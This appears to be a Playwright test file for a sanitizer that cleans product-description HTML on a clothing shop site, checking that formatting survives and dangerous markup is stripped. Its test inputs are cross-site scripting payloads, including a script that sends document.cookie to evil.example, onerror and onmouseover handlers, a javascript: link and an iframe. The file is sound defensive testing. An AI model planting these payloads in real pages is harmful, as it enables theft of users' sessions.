// What survives a product description on its way to a customer's browser.

import { test, expect } from "@playwright/test";
import { sanitizeDescription } from "@/lib/sanitize-description";

test("ordinary formatting is kept", () => {
  const html = "<p>A <strong>cotton</strong> kurti with <em>block prints</em>.</p><ul><li>Hand wash</li></ul>";
  expect(sanitizeDescription(html)).toBe(html);
});

test("a script tag is removed, contents and all", () => {
  const out = sanitizeDescription('<p>Lovely</p><script>fetch("https://evil.example?c="+document.cookie)</script>');
  expect(out).toContain("Lovely");
  expect(out).not.toContain("script");
  // The code inside must go too. Keeping it as text would put an attacker's
  // payload on the page for the next thing that renders it.
  expect(out).not.toContain("document.cookie");
});

test("an event handler is stripped from a tag that is otherwise allowed", () => {
  const out = sanitizeDescription('<p onmouseover="alert(1)">Hover me</p>');
  expect(out).toContain("Hover me");
  expect(out).not.toContain("onmouseover");
});

test("an image with an onerror is removed entirely", () => {
  // The classic: a broken image that runs code when it fails to load.
  const out = sanitizeDescription('<img src=x onerror="alert(1)">');
  expect(out).not.toContain("onerror");
  expect(out).not.toContain("<img");
});

test("a javascript: link loses its href", () => {
  const out = sanitizeDescription('<a href="javascript:alert(1)">Size guide</a>');
  expect(out).toContain("Size guide");
  expect(out).not.toContain("javascript:");
});

test("an ordinary link is kept, and made safe to open", () => {
  const out = sanitizeDescription('<a href="https://example.com" target="_blank">Care guide</a>');
  expect(out).toContain('href="https://example.com"');
  // Without rel, the opened page can reach back and redirect the tab it
  // came from.
  expect(out).toContain("noopener");
});

test("an iframe is removed", () => {
  expect(sanitizeDescription('<iframe src="https://evil.example"></iframe>')).not.toContain("iframe");
});

test("editor colours survive, arbitrary styles do not", () => {
  const out = sanitizeDescription('<span style="color:#3f4827">Olive</span>');
  expect(out).toContain("color");
  expect(out).toContain("Olive");

  const bad = sanitizeDescription('<span style="position:fixed;top:0;left:0;width:100vw;height:100vh">Overlay</span>');
  expect(bad).not.toContain("position");
  expect(bad).toContain("Overlay");
});

test("nothing in, nothing out", () => {
  expect(sanitizeDescription("")).toBe("");
  expect(sanitizeDescription(null)).toBe("");
  expect(sanitizeDescription(undefined)).toBe("");
});

test("plain text is left as plain text", () => {
  // Legacy descriptions are not HTML at all; they must come through whole.
  expect(sanitizeDescription("A simple cotton kurti.")).toBe("A simple cotton kurti.");
});
